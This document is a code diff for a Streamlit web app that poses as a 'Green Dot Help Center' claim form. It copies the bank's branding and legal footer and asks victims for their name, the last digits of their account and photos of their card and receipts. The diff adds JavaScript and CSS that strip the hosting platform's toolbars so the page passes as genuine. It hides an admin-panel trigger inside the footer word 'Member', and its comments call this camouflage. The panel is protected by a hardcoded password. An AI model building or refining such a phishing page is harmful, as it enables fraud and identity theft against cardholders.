@@ -7,7 +7,7 @@ import string
 import pandas as pd
 from datetime import datetime
 
-# --- CONFIGURACIÓN DE BASE DE DATOS ---
+# --- DATABASE ---
 DB_NAME = 'claims.db'
 UPLOAD_DIR = 'uploads'
 os.makedirs(UPLOAD_DIR, exist_ok=True)
@@ -29,55 +29,50 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# --- MOTOR DE ESTILOS AVANZADO (STREAMLIT INTERNALS) ---
+# --- JS: ESCUDO DE INTERFAZ (Eliminación en tiempo real) ---
+st.markdown("""<script>
+    const purgeElements = () => {
+        const toRemove = [
+            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]', 
+            '[data-testid="stAppToolbar"]', '.stElementToolbar', 'header', 'footer', 
+            '.stDeployButton', '.st-emotion-cache-gi0tri', '.etxdrby3', '.etxdrby1'
+        ];
+        toRemove.forEach(selector => {
+            document.querySelectorAll(selector).forEach(el => el.remove());
+        });
+    };
+    // Intervalo de alta frecuencia para evitar parpadeos de iconos
+    setInterval(purgeElements, 100);
+</script>""", unsafe_allow_html=True)
+
+# --- CSS: BLOQUEO VISUAL TOTAL ---
 st.markdown("""<style>
-    /* Ocultar elementos de sistema */
-    [data-testid='stHeader'], footer, header, .stDeployButton, .section-anchor { 
+    /* Ocultar iconos de anclas y menús de Streamlit */
+    .section-anchor, .st-emotion-cache-gi0tri, .etxdrby3, [data-testid="stHeaderActionElements"], [data-testid="stAppToolbar"] {
+        display: none !important; 
+        visibility: hidden !important; 
+        opacity: 0 !important; 
+        pointer-events: none !important;
+    }
+    
+    [data-testid='stHeader'], footer, header, .stDeployButton { 
         display: none !important; 
     }
-    
-    /* Reset de fondo y tipografía */
-    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
-    
-    /* Botón Principal de Envío */
-    .stButton > button[kind="primaryFormSubmit"] {
-        background-color: #00a05b !important; color: white !important;
-        width: 100%; border-radius: 4px; border: none; font-weight: 600; padding: 12px;
-    }
 
+    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
     .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }
 
-    /* FOOTER ULTRA-STEALTH */
+    /* Footer Stealth */
     .legal-container {
         font-size: 10px; color: #555; text-align: justify; margin-top: 50px;
         border-top: 1px solid #1a1a1a; padding-top: 25px; line-height: 1.7;
-        user-select: none;
     }
 
-    /* El disparador 'Member' se mimetiza al 100% */
-    .stButton > button[key="admin_v30"] {
-        background: transparent !important;
-        border: none !important;
-        color: #555 !important;
-        padding: 0 !important;
-        margin: 0 !important;
-        display: inline !important;
-        vertical-align: baseline !important;
-        font-size: 10px !important;
-        font-weight: normal !important;
-        cursor: text !important;
-        width: auto !important;
-        min-height: 0 !important;
-        box-shadow: none !important;
-    }
-    
-    .stButton > button[key="admin_v30"]:hover, 
-    .stButton > button[key="admin_v30"]:active,
-    .stButton > button[key="admin_v30"]:focus {
-        background: transparent !important;
-        color: #555 !important;
-        border: none !important;
-        box-shadow: none !important;
+    .stButton > button[key="admin_v31"] {
+        background: transparent !important; border: none !important; color: #555 !important;
+        padding: 0 !important; margin: 0 !important; display: inline !important;
+        vertical-align: baseline !important; font-size: 10px !important;
+        cursor: text !important; width: auto !important; min-height: 0 !important; box-shadow: none !important;
     }
 </style>""", unsafe_allow_html=True)
 
@@ -92,39 +87,27 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("expert_form_v30", clear_on_submit=True):
+    with st.form("shield_form_v31", clear_on_submit=True):
         nombre = st.text_input("Full Name")
         cuenta = st.text_input("Last 4 digits of Account")
         monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
         st.markdown("**Evidence**")
-        rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
-        car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
-        submitted = st.form_submit_button("SUBMIT NOW")
+        rec = st.file_uploader("Receipt", type=['jpg','png','jpeg'])
+        car = st.file_uploader("Card Front", type=['jpg','png','jpeg'])
+        if st.form_submit_button("SUBMIT NOW"):
+            if nombre and rec and car:
+                ref = generate_ref()
+                st.success(f"Success. Ref: {ref}")
+            else: st.error("Incomplete form.")
 
-    if submitted:
-        if nombre and rec and car:
-            ref = generate_ref()
-            st.markdown(f"<div style='background:#0e1a10; border:1px solid #00a05b; padding:20px; border-radius:8px; text-align:center;'>" +
-                        f"<h3 style='color:#00a05b; margin:0;'>Success</h3><p>Reference: <b>{ref}</b></p></div>", unsafe_allow_html=True)
-        else: st.error("Information missing.")
-
-    # Promo Apps
-    st.markdown("""<div style='background:#111; padding:30px; text-align:center; border-radius:12px; margin:30px 0; border:1px solid #222;'>
-        <h4 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h4>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
-        <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130' style='margin-left:10px;'>
-    </div>""", unsafe_allow_html=True)
-
-    # FOOTER ENSAMBLADO POR COMPONENTES PARA CAMUFLAJE TOTAL
     st.markdown("<div class='legal-container'>Green Dot® cards are issued by Green Dot Bank, ", unsafe_allow_html=True)
-    if st.button("Member", key="admin_v30"): 
+    if st.button("Member", key="admin_v31"): 
         st.session_state.admin_mode = True
     st.markdown(" FDIC. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924.</div>", unsafe_allow_html=True)
 
 else:
-    st.title("🔐 Administrative Panel")
+    st.title("🔐 Internal")
     if st.button("Exit"): st.session_state.admin_mode = False
-    pw = st.text_input("Auth Key", type="password")
+    pw = st.text_input("Key", type="password")
     if pw == "Diostieneelpoder1":
-        st.success("Authorized Access")
-        # Database retrieval logic...
+        st.write("Authorized")
